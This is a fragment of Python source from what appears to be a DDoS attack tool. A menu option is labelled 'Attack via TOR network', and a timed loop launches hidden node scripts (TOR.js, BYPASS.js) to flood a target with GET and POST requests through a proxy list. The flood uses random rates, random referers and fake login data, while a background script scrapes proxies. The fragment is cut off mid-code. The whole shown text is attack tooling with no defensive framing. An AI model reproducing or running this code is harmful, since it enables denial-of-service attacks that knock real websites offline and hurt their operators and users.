   ...
   -  TOR   : Attack via TOR network
                ...
                try:
                    ...
                    while t.time() - st_tm < mx_tm:
                        if cmd == "TOR":
                            rn_cmd(
                                f'node bin/odd/.cache/TOR.js GET "{tg}" 600 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                            )
                            rn_cmd(f"python3 bin/odd/.cache/scrape.py &")
                            rn_cmd(
                                f'node bin/odd/.cache/TOR.js POST "{tg}" 600 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                            )
                        elif cmd == "BYPASS":
                            rn_cmd(
                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 proxy.txt"
                            )
                            rn_cmd(f"python3 bin/odd/.cache/scrape.py &")
                            rn_cmd(
                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 proxy.txt"
